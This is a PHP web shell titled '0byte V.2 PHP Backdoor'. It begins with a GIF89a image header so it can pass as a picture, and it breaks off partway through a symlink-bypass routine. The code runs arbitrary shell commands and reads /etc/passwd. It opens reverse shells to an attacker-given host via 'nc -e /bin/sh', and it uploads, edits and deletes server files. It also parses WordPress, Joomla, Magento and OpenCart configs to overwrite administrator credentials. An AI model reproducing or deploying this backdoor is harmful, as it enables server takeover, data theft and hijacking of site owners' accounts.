GIF89a;
<?php
/* 0byte V.2 PHP Backdoor - www.zerobyte.id */
set_time_limit(0);
error_reporting(0);
error_log(0);

function GrabUrl($url,$type){
$urlArray = array();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
$regex='|<a.*?href="(.*?)"|';
	preg_match_all($regex,$result,$parts);
	$links=$parts[1];
	foreach($links as $link){
	array_push($urlArray, $link);
	}
	curl_close($ch);
	foreach($urlArray as $value){
	$lol="$url$value";
				if(preg_match("#$type#is", $lol)) {
					echo "$lol\r\n";
				}
	}
	}
	function exect($cmd) {
		if(function_exists('system')) {
			@ob_start();
			@system($cmd);
			$exect = @ob_get_contents();
			@ob_end_clean();
			return $exect;
		} elseif(function_exists('exec')) {
			@exec($cmd,$results);
			$exect = "";
			foreach($results as $result) {
			$exect .= $result;
			}
			return $exect;
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cmd);
			$exect = @ob_get_contents();
			@ob_end_clean();
			return $exect;
		} elseif(function_exists('shell_exec')) {
			$exect = @shell_exec($cmd);
			return $exect;
		}
	}
	function getpasswd(){
		if(function_exists('system')) {
			@ob_start();
			@system('cat /etc/passwd');
			$exect = @ob_get_contents();
			@ob_end_clean();
			return $exect;
		} 
		elseif(function_exists('exec')) {
			@exec('cat /etc/passwd',$results);
			$exect = "";
			foreach($results as $result) {
			$exect .= $result;
			}
			return $exect;
		} 
		elseif(function_exists('passthru')) {
			@ob_start();
			@passthru('cat /etc/passwd');
			$exect = @ob_get_contents();
			@ob_end_clean();
			return $exect;
		} 
		elseif(function_exists('shell_exec')) {
			$exect = @shell_exec('cat /etc/passwd');
			return $exect;
		} else {
			for ($uid=0;$uid<600000;$uid++) { 
				$ara = posix_getpwuid($uid);
				if (!empty($ara)) {
					while (list ($key, $val) = each($ara)){
						print "$val:";
					}
					print "\n";
				}
			}
		}
	}
	function fperms($filen) {
		$perms = fileperms($filen);
		$fpermsinfo .= (($perms & 0x0100) ? 'r' : '-');
		$fpermsinfo .= (($perms & 0x0080) ? 'w' : '-');
		$fpermsinfo .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
		$fpermsinfo .= (($perms & 0x0020) ? 'r' : '-');
		$fpermsinfo .= (($perms & 0x0010) ? 'w' : '-');
		$fpermsinfo .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
		$fpermsinfo .= (($perms & 0x0004) ? 'r' : '-');
		$fpermsinfo .= (($perms & 0x0002) ? 'w' : '-');
		$fpermsinfo .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
		if(!is_writable($filen)) {
			echo '<center><small><font color=red>'.$fpermsinfo.'</font></small></center>';
		} else {
			echo "<center><small><font color=lime>".$fpermsinfo."</font></small></center>";
		}
	}
	function eof(){
		echo "\x77\x77\x77\x2e\x7a\x65\x72\x6f\x62\x79\x74\x65\x2e\x69\x64";
	}
	?>
	<title>0byteV2 - PHP Backdoor</title>
	<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
	<style type="text/css">
	body {
		font-family: courier;
		background: #000d1a;
		color: #e8f5e9;
		font-size: 1px;
	}
	h1 a {
		font-weight: normal;
		font-family: 'Share Tech Mono';
		font-size: 20px;
		color:#27f6a4;
		text-decoration: none;
		margin: 0px;
	}
	h2 {
		font-size: 20px;
		color: #27f6a4;
		text-align: center;
		padding-top: 5px;
		margin: 0;
		margin-top: 10px;
	}
	.menu {
		text-align: center;
		font-size: 12px;
		border-bottom: 1px dashed #27f6a4;
		padding-bottom: 5px;
		margin-bottom: 10px;
	}
	.menu a {
		margin-top: 2px;
		color: #27f6a4;
		text-decoration: none;
		display: inline-block;
	}
	.container {
		font-size: 12px;
	}
	.filemgr {
		font-size: 12px;
		width: 100%
	}
	.filemgr td {
		padding: 3px;
		border-bottom: 1px dashed #27f6a4;
	}
	.filemgr a{
		text-decoration: none;
		color:#27f6a4;
	}
	tr:hover {
		background: #003366;
	}
	.nohover:hover {
		background: transparent;
	}
	.tdtl {
		background:#27f6a4;
		color:#000d1a;
		text-align:center;
		font-weight:bold;
	} .footer {
		text-align: center;
		border-radius: 30px;
		margin-top: 25px;
		border-top: 1px double #27f6a4;
		padding: 5px;
	} .footer a {
		color: #27f6a4;
		text-decoration: none;
	}
	p {
		word-wrap: break-word;
		margin:2;
	}
	a {
		text-decoration: none;
		color: #27f6a4;
	}
	.act {
		text-align: center;
	}
	.txarea {
		width:100%;
		height:500px;
		background:transparent;
		border:1px solid #27f6a4;
		padding:1px;
		color:#27f6a4;
		resize: none;
	}
	h4 {
		margin:0;
	}
	.yyy {
		background: transparent;
		color: #27f6a4;
		border: 1px #27f6a4 solid;
		padding: 2px;
	}
	.xxx {
		color: #000d1a;
		background: #27f6a4;
		border: 1px #27f6a4 solid;
		padding: 2px;
	}
	</style>
	<div class="container">
		<div style="position:relative;width: 100%;margin-bottom: 5px;border-bottom: 1px dashed #27f6a4;">
			<div style="float:left;width:15%;text-align:center;border: 1px dashed #27f6a4;margin-bottom:5px;">
				<h1>
				<a href="?">0byte V.2<br>
					<small>PHP Backdoor</small>
				</a>
				</h1>
			</div>
			<div style="float:right;width:83%;">
				<?php
				echo php_uname();
				if(preg_match('/\b\d{4}\b/', php_uname("v"), $matches)) {
					$year = $matches[0];
					$url = "https://www.google.com/search?q=%22".php_uname("s")."%22+%22".php_uname("r")."%22+%22$year%22+%22Exploit%22";
					echo " <a href=\"$url\" target=\"_blank\">[ FIND EXPLOIT ]</a>";
				}
				$mysql = (function_exists('mysql_connect')) ? "<font color=#27f6a4>ON</font>" : "<font color=red>OFF</font>";
				$curl = (function_exists('curl_version')) ? "<font color=#27f6a4>ON</font>" : "<font color=red>OFF</font>";
				$wget = (exect('wget --help')) ? "<font color=#27f6a4>ON</font>" : "<font color=red>OFF</font>";
				$perl = (exect('perl --help')) ? "<font color=#27f6a4>ON</font>" : "<font color=red>OFF</font>";
				$gcc = (exect('gcc --help')) ? "<font color=#27f6a4>ON</font>" : "<font color=red>OFF</font>";
				$disfunc = @ini_get("disable_functions");
				$show_disf = (!empty($disfunc)) ? "<font color=red>$disfunc</font>" : "<font color=#27f6a4>NONE</font>";
				echo '<br>[ MySQL: '.$mysql.' ][ Curl: '.$curl.' ][ Wget: '.$wget.' ][ Perl: '.$perl.' ][ Compiler: '.$gcc.' ]';
				echo '<p>Disable Function: '.$show_disf;
					echo '<p>Server IP : '.gethostbyname($_SERVER['HTTP_HOST']).'<br />';
						?>
					</div>
					<div style="clear:both;"></div>
				</div>
				<?php
				if(empty($_GET)) {
					$dir = getcwd();
				} else {
					$dir = $_GET['path'];
				}
				if(!empty($_GET['path'])) {
					$offdir = $_GET['path'];
				} else if(!empty($_GET['file'])) {
					$offdir = dirname($_GET['file']);
				} else if(!empty($_GET['lastpath'])) {
					$offdir = $_GET['lastpath'];
				} else {
					$offdir = getcwd();
				}
				?>
				<div class="menu">
					<a href="?ext=usersreadblepath&lastpath=<?php echo $offdir;?>">[ Readable Users Path ]</a>
					<a href="?ext=sql_interface&lastpath=<?php echo $offdir;?>">[ Adminer ]</a>
					<a href="?ext=shellcmd&lastpath=<?php echo $offdir;?>">[ Shell Command ]</a>
					<a href="?ext=reverseshell&lastpath=<?php echo $offdir;?>">[ Reverse Shell ]</a>
					<a href="?ext=vdomain&lastpath=<?php echo $offdir;?>">[ Shows vDomain ]</a>
					<a href="?ext=uploader&lastpath=<?php echo $offdir;?>">[ Uploader ]</a>
					<a href="?config=grabber&lastpath=<?php echo $offdir;?>">[ Config Grabber ]</a>
					<a href="?mass=changer&lastpath=<?php echo $offdir;?>">[ Mass User Changger ]</a>
					<a href="?bypass=symlink404&lastpath=<?php echo $offdir;?>">[ Bypass Symlink404 ]</a>
				</div>
				<?php
				echo '<div style="margin-bottom:10px;">';
					echo '<span style="border:1px dashed #27f6a4;padding:2px;">';
						$lendir = str_replace("\\","/",$offdir);
						$xlendir = explode("/", $lendir);
						foreach($xlendir as $c_dir => $cdir) {
							echo "<a href='?path=";
								for($i = 0; $i <= $c_dir;  $i++) {
									echo $xlendir[$i];
									if($i != $c_dir) {
										echo "/";
									}
								}
							
							echo "'>$cdir</a>/";
						}
						$prem = (is_writable($offdir)) ? "<font color=lime>Writable</font>" : "<font color=red>Writable</font>";
						echo " [$prem]";
					echo '</span></div>';
					if(!empty($dir)) {
						echo '<table class="filemgr">';
							echo '<tr><td class="tdtl">Name</td><td class="tdtl" width="9%">Permission</td><td class="tdtl" width="18%">Action</td></tr>'."\n";
							$directories = array();
							$files_list = array();
							$files = scandir($dir);
							foreach($files as $file){
								if(($file != '.') && ($file != '..')){
									if(is_dir($dir.'/'.$file)) {
										$directories[] = $file;
									} else {
										$files_list[] = $file;
									}
								}
							}
							foreach($directories as $directory){
								echo '<tr><td><span class="dbox">[D]</span> <a href="?path='.$dir.'/'.$directory.'">'.$directory.'/</a></td>'."\n";
								echo '<td>';
									fperms($dir.'/'.$directory);
								echo '</td>'."\n";
								echo '<td class="act">';
									echo '<a href="?action=rename&file='.$dir.'/'.$directory.'" class="act">RENAME</a> ';
									echo '<a href="?action=rmdir&file='.$dir.'/'.$directory.'" class="act">DELETE</a>';
								echo '</td>'."\n";
							echo '</tr>'."\n";
						}
						foreach($files_list as $filename){
							if(preg_match('/(tar.gz)|(tgz)$/', $filename)) {
								echo '<tr><td><span class="dbox">[F]</span> <a href="#" class="act">'.$filename.'</a>'."\n";
								echo ' <a href="?ext=extract2tmp&gzname='.$dir.'/'.$filename.'" style="background:#27f6a4;color:#000d1a;padding:1px;padding-left:5px;padding-right:5px;">EXTRACT TO TMP</a>';
							echo '</td>'."\n";
							echo '<td>';
								fperms($dir.'/'.$filename);
							echo '</td>'."\n";
							echo '<td class="act">';
								echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
								echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
								echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
							echo '</td>'."\n";
						echo '</tr>'."\n";
					} else {
						echo '<tr><td><span class="dbox">[F]</span> <a href="?action=view&file='.$dir.'/'.$filename.'" class="act">'.$filename.'</a></td>'."\n";
						echo '<td>';
							fperms($dir.'/'.$filename);
						echo '</td>'."\n";
						echo '<td class="act">';
							echo '<a href="?action=edit&file='.$dir.'/'.$filename.'" class="act">EDIT</a> ';
							echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
							echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
							echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
						echo '</td>'."\n";
					echo '</tr>'."\n";
				}
			}
		echo '</table>';
	}
	if($_GET['action'] == 'edit') {
		if($_POST['save']) {
			$save = file_put_contents($_GET['file'], $_POST['src']);
			if($save) {
				$act = "<font color=#27f6a4>Successed!</font>";
			} else {
				$act = "<font color=red>Permission Denied!</font>";
			}
			echo "".$act."<br>";
		}
		echo "Filename: <font color=#27f6a4>".basename($_GET['file'])."</font>";
	echo "<form method='post'> <textarea name='src' class='txarea'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br> <input type='submit' value='Save' name='save' style='width: 20%;background:#27f6a4;border:none;color:#000d1a;margin-top:5px;height:30px;'> </form>";
}
else if($_GET['action'] == 'view') {
	echo "Filename: <font color=#27f6a4>".basename($_GET['file'])."</font>";
	echo "<textarea class='txarea' style='height:400px;' readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
}
else if($_GET['action'] == 'rename') {
	$path = $offdir;
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$path/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<font color=#27f6a4>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
		echo "".$act."<br>";
	}
	echo "Filename: <font color=#27f6a4>".basename($_GET['file'])."</font>";
	echo "<form method='post'> <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'> <input type='submit' name='do_rename' value='rename'> </form>";
}
else if($_GET['action'] == 'delete') {
	$path = $offdir;
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?path=".$path."';</script>";
	} else {
		$act = "<font color=red>Permission Denied!</font>";
	}
	echo $act;
} else if($_GET['action'] == 'rmdir') {
	$path = $offdir;
	$delete = rmdir($_GET['file']);
	if($delete) {
		echo '<font color=#27f6a4>Deleted!</font><br>';
	} else {
		echo "\n<font color=red>Error remove dir, try to force delete!</font>\n<br>";
		exect('rm -rf '.$_GET['file']);
		if(file_exists($_GET['file'])) {
			echo '<font color=red>Permission Denied!</font>';
		} else {
			echo '<font color=#27f6a4>Deleted!</font>';
		}
	}
} else if($_GET['action'] == 'download') {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment;filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}
if($_GET['ext'] == 'usersreadblepath') {
	echo '<h2>.::[ Readable Users Path ]::.</h2>';
	$potent_dir = array("", "public_html", "backupwordpress", "scriptupdate", "backups", "backup", "www", "fantastico_backups", "softaculous_backups");
	$i = 0;
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc ) {
			echo "Can't read /etc/passwd";
		}
		else {
			preg_match_all('/(.*?):x:/', $passwd, $user);
			foreach($user[1] as $users) {
				foreach ($potent_dir as $p_dir) {
					$chkdir = "/home/$users/$p_dir";
					$chkdir2 = "/home/$users/$users/$p_dir";
					if(is_readable($chkdir)) {
						$i++;
						if(is_writable($chkdir)) {
							echo "[RW] <a href='?path=$chkdir'>$chkdir</a><br>\n";
						} else {
							echo "[R] <a href='?path=$chkdir'>$chkdir</a><br>\n";
						}
					} else if (is_readable($chkdir2)) {
						$i++;
						if(is_writable($chkdir2)) {
							echo "[RW] <a href='?path=$chkdir2'>$chkdir2</a><br>\n";
						} else {
						echo "[R] <a href='?path=$chkdir2'>$chkdir2</a><br>\n";
						}
					}
				}
			}
		}
	}
	if($i == 0) {
		echo '<br>Readable Users Path Is Empty!';
	} else {
		echo "<br>Total ".$i." Readable Users Path in ".gethostbyname($_SERVER['HTTP_HOST']).".";
	}
}
if($_GET['ext'] == 'vdomain') {
	echo '<center>';
	function vdomain($domaindir) {
		$domainfile = scandir($domaindir);
		$i = 0;
		echo "<table width='80%'>\n";
		echo "<tr><th>Domain</th><th>User</th><th>Jump BW</th></tr>";
		foreach($domainfile as $domain){
			$i++;
			if(!is_dir($domain) && !preg_match('/^[*.]/', $domain) && !preg_match('/[0-9]$/', $domain)) {
				$user = exec("ls -l $domaindir$domain | awk '{print $3}'");
				echo '<tr><td>'.$domain.'</td><td width="15%" align="center"><small>'.$user.'</small></td>';
				if(is_readable("/home/$user/backupwordpress")){
					echo '<td width="13%" align="center">Yes</td>';
				} else {
					echo '<td width="13%"><center><font color="red">No</font></center></td>';
				}
				echo '</tr>';
			}
		}
		echo "</table>\n";
		echo "Total $i Domains.";
	}
	if(is_readable("/etc/vfilters/")) {
		$domaindir = '/etc/vfilters/';
		vdomain($domaindir);
	} else if(is_readable("/etc/valiases/")) {
		$domaindir = '/etc/valiases/';
		vdomain($domaindir);
	} else {
		echo "<h3 style=\"color:red;\">vDomain Is Empty!</h3>";
	}
	echo '</center>';
} else if($_GET['ext'] == 'extract2tmp') {
	if (file_exists($_SERVER["DOCUMENT_ROOT"].'/tmp/') && is_writable($_SERVER["DOCUMENT_ROOT"].'/tmp/')) {
		$tmppath = $_SERVER["DOCUMENT_ROOT"].'/tmp/';
	} else if(file_exists(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/') && is_writable(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/')) {
		$tmppath = dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/';
	} else if(file_exists('/tmp/') && is_writable('/tmp/')) {
		$tmppath = '/tmp/';
	} else {
		$tmppath = '';
	} if(!empty($tmppath)) {
		$gzfile = $_GET['gzname'];
		echo '[FILE] '.$gzfile.'<br>';
		echo '-- extract to --<br>';
		echo '[TMP] '.$tmppath.'<br>';
		$bsname = basename($gzfile);
		$gzrname = explode(".", $bsname);
		echo '<form method="post" action="">';
		echo '<input name="extract" type="submit" value="EXTRACT">';
		echo '</form>';
		if(!empty($_POST['extract'])) {
			exect('mkdir '.$tmppath.$gzrname[0]);
			$destdir = $tmppath.$gzrname[0];
			if (file_exists($destdir) && is_writable($destdir)) {
				echo "\n".'[EXTRACTED] <a href="?path='.$destdir.'">'.$destdir.'</a>'."\n";
				exect('tar -xzvf '.$gzfile.' -C '.$destdir);
			} else {
				echo 'FAILED!';
			}
		}
	} else {
		echo 'CANNOT EXTRACT TO TMP!';
	}
}
else if($_GET['ext'] == 'shellcmd') {
	echo '<h2>.::[ Shell Command ]::.</h2>';
	echo '<form method="post" action="">';
	echo 'terminal:~$ <input name="cmd" type="text" placeholder="echo zerobyte" style="width:300px"/>';
	echo ' <input type="submit" value=">>"/>';
	echo '</form>';
	if(!empty($_POST['cmd'])) {
		echo '<textarea style="width:100%;height:150px;" readonly>';
		$cmd = $_POST['cmd'];
		echo exect($cmd);
		echo '</textarea>';
	}
} else if($_GET['ext'] == 'reverseshell') {
	echo '<h2>.::[ Reverse Shell ]::.</h2>';
	echo '<form method="post">';
	echo "<center>";
	echo "<table style='border: 1px #27f6a4 solid;'>";
	echo "<br><tr class='nohover'><td>PHP</td> <td>:</td>";
	echo '<td><input name="rev-php-addr" type="text" placeholder="0.0.0.0" class="yyy"/> ';
	echo '<input name="rev-php-port" type="text" placeholder="1337" class="yyy" style="width:40px;"/> ';
	echo '<input type="submit" class="xxx" value="Do!"/></td></tr>';
	echo "</table><br><table style='border: 1px #27f6a4 solid;'><tr class='nohover'><td>NC</td> <td>:</td>";
	echo '<td><input name="rev-nc-addr" type="text" placeholder="0.0.0.0" class="yyy"/> ';
	echo '<input name="rev-nc-port" type="text" placeholder="1337" class="yyy" style="width:40px;"/> ';
	echo '<input type="submit" class="xxx" value="Do!"/></td></tr>';
	echo "</table></center>";
	echo '</form>';
	if(isset($_POST['rev-php-addr'])) {
		$bindaddr = $_POST['rev-php-addr'];
		$bindport = $_POST['rev-php-port'];
		$sock=fsockopen("$bindaddr",$bindport);
		exect("/bin/sh -i <&3 >&3 2>&3");
	} else if (isset($_POST['rev-nc-addr'])) {
		$bindaddr = $_POST['rev-nc-addr'];
		$bindport = $_POST['rev-nc-port'];
		exect("nc -e /bin/sh $bindaddr $bindport");
	}
}
else if($_GET['ext'] == 'uploader') {
	echo '<h2>.::[ Uploader ]::.</h2>';
	echo '<center>';
	echo '<form method=post enctype=multipart/form-data>';
	echo '<br><br>PATH ['.$offdir.']<br>';
	echo '<input type="file" name="zerofile"><input name="postupl" type="submit" value="Upload"><br>';
	echo '</form>';
	if($_POST["postupl"] == 'Upload') {
		if(@copy($_FILES["zerofile"]["tmp_name"],"$offdir/".$_FILES["zerofile"]["name"])) {
			echo '<b>OK! '."$offdir/".$_FILES["zerofile"]["name"].'</b>';
		} else {
			echo '<b>Upload Failed.</b>';
		}
	}
	echo '</center>';
}
else if($_GET['ext'] == 'sql_interface') {
	echo '<h2>.::[ Adminer ]::.</h2>';
	echo '<center>';
	$version='4.7.0';
	$dwadminer = 'https://www.adminer.org/static/download/'.$version.'/adminer-'.$version.'.php';
	$fileadminer = 'adminer.php';
	function call_adminer($dwadminer, $fileadminer) {
		$fp = fopen($fileadminer, "w+");
		$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $dwadminer);
			curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
			curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
		file_put_contents($dwadminer, $fileadminer);
	}
	call_adminer($dwadminer, $fileadminer);
	$linkz = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
	if(file_exists('adminer.php')) {
		echo '<p><a href="'.$linkz.dirname($_SERVER['PHP_SELF']).'/'.$fileadminer.'" target="_blank">Adminer OK, Click Here!</a></p>';
	} else {
		echo '<font color="red">[FAILED]</font>';
	}
	echo '</center>';
}
elseif($_GET['mass'] == 'changer') {
if($_POST['sikat']) {
echo "<center><h1>Config Reset Password</h1>
<form method='post'>
Link Config: <br>
<textarea name='link' class='txarea'>";
GrabUrl($_POST['linkconfig'],'txt');
echo"</textarea><br>
User Baru : <input type='text' name='newuser' placeholder='con7ext' style='background:transparent;border:1px solid #27f6a4;padding:1px;color:#27f6a4;'> <br><br>
Password Baru : <input type='text' name='newpasswd' placeholder='con7ext' style='background:transparent;border:1px solid #27f6a4;padding:1px;color:#27f6a4;'><br><br>
<input type='submit' style='width: 450px;' name='masschanger' value='Hajar!!'>
</form></center>";
}else {
echo '<center>
<h1>Config Reset Password</h1>
<form method="post">
</select><br>
Link Config :<br>
<input type="text" name="linkconfig" style="width: 450px;background:transparent;border:1px solid #27f6a4;color:#27f6a4;" placeholder="http://jembod.com/brudul_symconf/"><br>
<input type="submit" style="width: 450px;" name="sikat" value="Change User!!">
</form></center>';
}
if($_POST['masschanger']) {
$user = $_POST['newuser'];
$pass = $_POST['newpasswd'];
$passx = md5($pass);
$link = explode("\r\n", $_POST['link']);
foreach($link as $file_conf) {
$config = file_get_contents($file_conf);
if(preg_match("/JConfig|joomla/",$config)) {
$dbhost = ambilkata($config,"host = '","'");
$dbuser = ambilkata($config,"user = '","'");
$dbpass = ambilkata($config,"password = '","'");
$dbname = ambilkata($config,"db = '","'");
$dbprefix = ambilkata($config,"dbprefix = '","'");
$prefix = $dbprefix."users";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
$result = mysql_fetch_array($q);
$id = $result['id'];
$site = ambilkata($config,"sitename = '","'");
$update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
echo "CMS: Joomla<br>";
if($site == '') {
echo "Sitename => <font color=red>Error Cok</font><br>";
} else {
echo "Sitename => $site<br>";
}
if(!$update OR !$conn OR !$db) {
echo "[-] <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "[+] username: <font color=lime>$user</font><br>";
echo "[+] password: <font color=lime>$pass</font><br><br>";
}
mysql_close($conn);
} elseif(preg_match("/WordPress/",$config)) {
$dbhost = ambilkata($config,"DB_HOST', '","'");
$dbuser = ambilkata($config,"DB_USER', '","'");
$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
$dbname = ambilkata($config,"DB_NAME', '","'");
$dbprefix = ambilkata($config,"table_prefix  = '","'");
$prefix = $dbprefix."users";
$option = $dbprefix."options";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
$result = mysql_fetch_array($q);
$id = $result[ID];
$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
$result2 = mysql_fetch_array($q2);
$target = $result2[option_value];
if($target == '') {
$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
} else {
$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
}
$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE id='$id'");
echo "CMS: Wordpress<br>";
echo $url_target;
if(!$update OR !$conn OR !$db) {
echo "[-] <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "[+] username: <font color=lime>$user</font><br>";
echo "[+] password: <font color=lime>$pass</font><br><br>";
}
mysql_close($conn);
} elseif(preg_match("/Magento|Mage_Core/",$config)) {
$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
$prefix = $dbprefix."admin_user";
$option = $dbprefix."core_config_data";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
$result = mysql_fetch_array($q);
$id = $result[user_id];
$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
$result2 = mysql_fetch_array($q2);
$target = $result2[value];
if($target == '') {
$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
} else {
$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
}
$update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
echo "CMS: Magento<br>";
echo $url_target;
if(!$update OR !$conn OR !$db) {
echo "[-] <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "[+] username: <font color=lime>$user</font><br>";
echo "[+] password: <font color=lime>$pass</font><br><br>";
}
mysql_close($conn);
} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
$dbname = ambilkata($config,"'DB_DATABASE', '","'");
$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
$prefix = $dbprefix."user";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
$result = mysql_fetch_array($q);
$id = $result[user_id];
$target = ambilkata($config,"HTTP_SERVER', '","'");
if($target == '') {
$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
} else {
$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
}
$update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
echo "CMS: OpenCart<br>";
echo $url_target;
if(!$update OR !$conn OR !$db) {
echo "[-] <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "[+] username: <font color=lime>$user</font><br>";
echo "[+] password: <font color=lime>$pass</font><br><br>";
}
mysql_close($conn);
} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
$dbhost = ambilkata($config,'server = "','"');
$dbuser = ambilkata($config,'username = "','"');
$dbpass = ambilkata($config,'password = "','"');
$dbname = ambilkata($config,'database = "','"');
$prefix = "users";
$option = "identitas";
$conn = mysql_connect($dbhost,$dbuser,$dbpass);
$db = mysql_select_db($dbname);
$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
$result = mysql_fetch_array($q);
$target = $result[alamat_website];
if($target == '') {
$target2 = $result[url];
$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
if($target2 == '') {
$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
} else {
$cek_login3 = file_get_contents("$target2/adminweb/");
$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
} else {
$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
}
}
} else {
$cek_login = file_get_contents("$target/adminweb/");
$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
} else {
$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
}
}
$update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE level='admin'");
echo "CMS: Lokomedia<br>";
if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
echo $url_target2;
} else {
echo $url_target;
}
if(!$update OR !$conn OR !$db) {
echo "[-] <font color=red>".mysql_error()."</font><br><br>";
} else {
echo "[+] username: <font color=lime>$user</font><br>";
echo "[+] password: <font color=lime>$pass</font><br><br>";
}
mysql_close($conn);
}
}
}
}
elseif ($_GET['bypass'] == 'symlink404') {
	if ($_POST['bypass']) {
		@error_reporting(0);
		@ini_set('display_errors', 0);

		mkdir("xnxxxxx", 0777);

		// $passwd = explode("\n", shell_exec('cat /etc/passwd | cut -d: -f1'));
		$passwd = $_POST['passwd'];
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach ($user_config[1] as $users) {
